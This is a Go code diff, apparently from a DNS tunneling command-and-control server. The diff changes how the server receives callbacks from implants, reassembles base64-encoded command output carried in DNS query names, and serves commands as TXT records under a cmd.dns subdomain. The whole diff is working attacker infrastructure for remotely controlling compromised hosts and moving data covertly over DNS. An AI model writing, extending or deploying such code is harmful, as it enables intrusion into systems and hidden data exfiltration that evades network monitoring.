@@ -4,10 +4,15 @@ import (
 	"encoding/base64"
 	"fmt"
 	"math/rand"
+	"strconv"
 	"strings"
+	"sync"
 
 	"github.com/miekg/dns"
 )
+
+var msgcache = map[int]string{}
+var msgcacheMutex = sync.RWMutex{}
 
 func parseQuery(m *dns.Msg) {
 	for _, q := range m.Question {
@@ -23,19 +28,34 @@ func parseQuery(m *dns.Msg) {
 					if !connectionExist(sub[2]) {
 						AddConnection(sub[2])
 						sessionID = sub[2]
-						fmt.Println("New callback: " + Base64Decode(sub[0]) + ":" + sub[2])
+						fmt.Println("\nNew callback: " + Base64Decode(sub[0]) + ":" + sub[2])
 					}
 
 				} else {
-					fmt.Print(Base64Decode(sub[0] + "=="))
-					ip := records[q.Name]
-					if ip != "" {
-						rr, err := dns.NewRR(fmt.Sprintf("%s A %s", q.Name, ip))
-						if err == nil {
-							m.Answer = append(m.Answer, rr)
+					parts := strings.Split(sub[0], "-")
+					if len(parts) > 2 {
+						if parts[0] == "0" {
+							fmt.Print("\n" + Base64Decode(parts[2]+"==") + "\n")
+						} else {
+							if parts[1] == "0" {
+								fmt.Println()
+							}
+							intVar1, _ := strconv.Atoi(parts[1])
+							addMsg(intVar1, Base64Decode(parts[2]+"=="))
+							intVar, _ := strconv.Atoi(parts[0])
+							if len(msgcache) == intVar {
+								msgcacheMutex.RLock()
+
+								send(msgcache)
+
+								msgcacheMutex.RUnlock()
+
+								//Clear Cache
+								msgcache = map[int]string{}
+							}
 						}
+						lineCache(Base64Encode(q.Name))
 					}
-					lineCache(Base64Encode(q.Name))
 				}
 			}
 		case dns.TypeTXT:
@@ -48,6 +68,10 @@ func parseQuery(m *dns.Msg) {
 			}
 		}
 	}
+}
+
+func send(msg map[int]string) {
+	messages <- msg
 }
 
 func HandleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {
@@ -74,6 +98,12 @@ func Base64Decode(str string) string {
 
 func AddTXTRecord(r string) {
 	records[curcmd+"."+csessionID+".cmd.dns.gostripe.click."] = r
+}
+
+func addMsg(loc int, m string) {
+	msgcacheMutex.Lock()
+	msgcache[loc] = m
+	msgcacheMutex.Unlock()
 }
 
 func lineCache(line string) {
